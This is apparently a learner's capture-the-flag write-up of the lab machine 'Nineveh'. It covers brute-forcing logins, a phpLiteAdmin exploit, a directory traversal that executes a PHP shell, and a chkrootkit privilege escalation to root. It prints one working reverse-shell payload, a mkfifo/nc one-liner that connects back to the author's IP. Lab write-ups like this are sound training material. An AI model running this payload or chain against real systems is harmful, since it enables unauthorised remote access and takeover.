# Nineveh

Nineveh

Sunday, 6 February 2022

10:36 am

This machine is a Linux machine.

Target IP is 10.10.10.43.

My IP is 10.10.16.5.

&#x20;

Early enumeration reveals there is a HTTP server on it.

&#x20;

!\[\[16\_Nineveh\_image001.png]]

&#x20;

!\[\[16\_Nineveh\_image002.png]]

&#x20;

!\[\[16\_Nineveh\_image003.png]]

&#x20;

!\[\[16\_Nineveh\_image004.png]]

&#x20;

The webpage seems to be just some random basic HTML page.

!\[\[16\_Nineveh\_image005.png]]

&#x20;

Info.php reveals some more information.

!\[\[16\_Nineveh\_image006.png]]

&#x20;

The whole page is full of details about the server and what engines its using. Nothing interesting though.

&#x20;

/department seems to be a log in page...

&#x20;

{width="8.260416666666666in" height="3.8020833333333335in"}

&#x20;

When inspecting the source, there's a hint towards SQL Injection.

!\[\[16\_Nineveh\_image008.png]]

&#x20;

For now, let's take a look at the HTTPS website. SQLMap does not seem to reveal anything, so let's come back to this later.

&#x20;

!\[\[16\_Nineveh\_image009.png]]

&#x20;

Interestingly, nmap vuln script picked up /db on the HTTPS website.

A quick searchsploit reveals that this has multiple vulnerabilities of interest.

&#x20;

!\[\[16\_Nineveh\_image0010.png]]

&#x20;

Anyways on both pages I decided to run hydra based attacks to see if I can get any credentials.

&#x20;

For HTTP:

!\[\[16\_Nineveh\_image0011.png]]

> &#x20;

For HTTPS:

!\[\[16\_Nineveh\_image0012.png]]

&#x20;

We are in!

For the HTTPS page, I can see that we are allowed to create some form of databases.

&#x20;

{width="17.677083333333332in" height="6.6875in"}

&#x20;

The HTTP page seems to be pointing towards fixing the login page and also some kind of secret folder...

&#x20;

{width="9.958333333333334in" height="7.375in"}

&#x20;

Taking the 24044 exploit previously scouted for phpliteadmin, we can see that we are able to create 'databases' and use the database as a reverse shell.

&#x20;

!\[\[16\_Nineveh\_image0015.png]]

&#x20;

Pretty cool! Did the steps but...I'm unable to execute my php code within it.

&#x20;

This has to do with something on the 'secret folder' mentioned at manage.php.

&#x20;

Upon closer inspection, there is actually a **notes** parameter being passed to identify where these notes are...

{width="8.25in" height="1.0625in"}

&#x20;

!\[\[16\_Nineveh\_image0017.png]]

I know the path is as such, but just injecting it in does not seem to execute it.

&#x20;

When fucking around with the directory some more, I managed to do this.

{width="10.208333333333334in" height="7.104166666666667in"}

&#x20;

This means that we have managed to execute our hack.php somehow through directory traversal. After modifying my php shell because of an error, I got this.

{width="9.010416666666666in" height="8.0625in"}

&#x20;

We've found a place we can inject code in, now time for the reverse shell.

rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+10.10.16.5+1234+%3E/tmp/f

&#x20;

This was the payload that worked for me.

!\[\[16\_Nineveh\_image0020.png]]

We are now www-data!

&#x20;

Moving to the root directory, I noticed an odd directory called /report

&#x20;

!\[\[16\_Nineveh\_image0021.png]]

Seems to be owned by the user, and interestingly, there's a rootkit on the machine!

&#x20;

!\[\[16\_Nineveh\_image0022.png]]

Anyways, the tool used is called **chkrootkit.**

&#x20;

Searchsploit reveals there is a local privilege escalation method.

{width="7.927083333333333in" height="2.2604166666666665in"}

&#x20;

I followed the instructions of the exploit. This involves writing a quick exploit to gain a root shell!

!\[\[16\_Nineveh\_image0024.png]]

&#x20;

Setting up a listener port, we managed to get a root shell.

!\[\[16\_Nineveh\_image0025.png]]

&#x20;

This box was really difficult for me, and I was lost. I would be lying to say I didn't refer to the solutions for the initial shell because I was lost! Directory traversal is needed to execute that.

&#x20;

I learnt a lot and will definitely refer to these again when I need it.
